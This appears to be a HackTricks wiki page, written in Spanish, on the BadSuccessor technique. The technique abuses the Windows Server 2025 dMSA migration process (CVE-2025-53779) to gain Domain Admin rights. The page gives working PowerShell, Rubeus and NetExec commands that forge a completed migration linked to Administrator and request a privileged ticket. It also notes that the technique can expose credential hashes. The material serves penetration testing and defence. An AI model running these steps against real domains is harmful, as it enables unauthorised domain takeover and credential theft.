# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor** abusa del flujo de trabajo de migración de **delegated Managed Service Account** (**dMSA**) introducido en **Windows Server 2025**. Un dMSA puede vincularse a una cuenta heredada mediante **`msDS-ManagedAccountPrecededByLink`** y moverse a través de los estados de migración almacenados en **`msDS-DelegatedMSAState`**. Si un atacante puede crear un dMSA en una OU con permisos de escritura y controlar esos atributos, el KDC puede emitir tickets para el dMSA controlado por el atacante con el **authorization context de la cuenta vinculada**.

En la práctica, esto significa que un usuario de bajo privilegio que solo tiene derechos delegados sobre una OU puede crear un nuevo dMSA, apuntarlo a `Administrator`, completar el estado de migración y luego obtener un TGT cuyo PAC contiene grupos privilegiados como **Domain Admins**.

## dMSA migration details that matter

- dMSA es una feature de **Windows Server 2025**.
- `Start-ADServiceAccountMigration` establece la migración en estado **started**.
- `Complete-ADServiceAccountMigration` establece la migración en estado **completed**.
- `msDS-DelegatedMSAState = 1` significa que la migración ha comenzado.
- `msDS-DelegatedMSAState = 2` significa que la migración se ha completado.
- Durante una migración legítima, se supone que el dMSA reemplaza de forma transparente a la cuenta suplantada, por lo que el KDC/LSA preservan el acceso que la cuenta anterior ya tenía.

Microsoft Learn también señala que durante la migración la cuenta original queda vinculada al dMSA y que el dMSA está destinado a acceder a lo que la cuenta antigua podía acceder. Esta es la suposición de seguridad que BadSuccessor abusa.

## Requirements

1. Un dominio donde **existe dMSA**, lo que significa que hay soporte de **Windows Server 2025** en la parte de AD.
2. El atacante puede **crear** objetos `msDS-DelegatedManagedServiceAccount` en alguna OU, o tiene derechos equivalentes amplios para crear objetos hijos allí.
3. El atacante puede **escribir** los atributos relevantes del dMSA o controlar completamente el dMSA que acaba de crear.
4. El atacante puede solicitar tickets Kerberos desde un contexto unido al dominio o desde un túnel que alcance LDAP/Kerberos.

### Practical checks

La señal operativa más limpia es verificar el nivel de dominio/bosque y confirmar que el entorno ya está usando la nueva stack de Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Si ves valores como `Windows2025Domain` y `Windows2025Forest`, trata **BadSuccessor / dMSA migration abuse** como una comprobación prioritaria.

También puedes enumerar OUs escribibles delegadas para la creación de dMSA con herramientas públicas:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Flujo de abuso

1. Crea una dMSA en una OU donde tengas derechos delegados de create-child.
2. Establece **`msDS-ManagedAccountPrecededByLink`** en el DN de un objetivo privilegiado como `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Establece **`msDS-DelegatedMSAState`** en `2` para marcar la migración como completada.
4. Solicita un TGT para la nueva dMSA y usa el ticket devuelto para acceder a servicios privilegiados.

Ejemplo de PowerShell:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Solicitud de ticket / ejemplos de herramientas operativas:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Por qué esto es más que privilege escalation

Durante una migración legítima, Windows también necesita que el nuevo dMSA gestione tickets que se emitieron para la cuenta anterior antes del cutover. Por eso el material relacionado con dMSA puede incluir claves **actuales** y **anteriores** en el flujo **`KERB-DMSA-KEY-PACKAGE`**.

Para una migración falsa controlada por un atacante, ese comportamiento puede convertir BadSuccessor en:

- **Privilege escalation** al heredar SIDs de grupos privilegiados en el PAC.
- **Exposición de material de credenciales** porque el manejo de la clave anterior puede exponer material equivalente al RC4/NT hash del predecesor en flujos vulnerables.

Eso hace que la técnica sea útil tanto para la toma de control directa del dominio como para operaciones posteriores, como pass-the-hash o un compromiso más amplio de credenciales.

## Notas sobre el estado del parche

El comportamiento original de BadSuccessor **no es solo un problema teórico de la preview de 2025**. Microsoft le asignó **CVE-2025-53779** y publicó una actualización de seguridad en **agosto de 2025**. Mantén este ataque documentado para:

- **labs / CTFs / ejercicios assume-breach**
- **entornos Windows Server 2025 sin parchear**
- **validación de delegaciones de OU y exposición de dMSA durante assessments**

No asumas que un dominio de Windows Server 2025 es vulnerable solo porque exista dMSA; verifica el nivel de parche y prueba con cuidado.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
